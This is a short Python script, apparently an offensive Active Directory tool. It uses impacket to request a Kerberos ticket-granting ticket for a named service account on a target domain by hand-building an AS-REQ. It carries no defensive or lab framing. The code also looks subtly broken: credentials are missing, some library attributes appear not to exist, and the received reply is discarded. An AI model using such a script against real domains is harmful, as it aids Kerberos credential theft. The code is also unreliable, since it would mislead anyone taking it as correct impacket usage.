from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, ETYPE_INFO2, ETYPE_INFO2_ENTRY, seq_set
from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
from impacket.krb5 import types
from impacket.krb5.types import Principal, KerberosTime, TicketFlags
from impacket import version
from impacket.examples import logger

# Initialize the logger
logger.init()

# Define the target domain and the service account
domain = 'target-domain.com'
service_account = 'service-account'

# Create a TGT for the service account
tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(service_account, domain)

# Create an AS-REQ for the service account
asReq = AS_REQ()

# Set the pvno and msg-type fields
asReq['pvno'] = 5
asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

# Set the padata field
paData = seq_set(asReq, 'padata', False)
paData2 = types.PAData()
paData2['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value)
eTypeInfo2 = ETYPE_INFO2()
eTypeInfo2_entry = ETYPE_INFO2_ENTRY()
eTypeInfo2_entry['etype'] = cipher.enctype
eTypeInfo2_entry['salt'] = service_account + domain
eTypeInfo2['etype-info2'] = [eTypeInfo2_entry]
paData2['padata-value'] = eTypeInfo2.getData()
paData.append(paData2)

# Set the req-body field
reqBody = seq_set(asReq, 'req-body', False)
reqBody['kdc-options'] = constants.KDCOptions.forwardable.value | constants.KDCOptions.renewable.value | \
constants.KDCOptions.proxiable.value | constants.KDCOptions.cname_in_pa_data.value

# Set the other fields of the req-body
reqBody['cname'] = types.PrincipalName()
reqBody['cname']['name-type'] = types.PrincipalNameType.NT_PRINCIPAL.value
reqBody['cname']['name-string'] = [service_account]
reqBody['realm'] = domain

# Send the AS-REQ and receive the AS-REP
asRep = sendReceive(asReq, domain, None)

# Print the service account's TGT
print(tgt)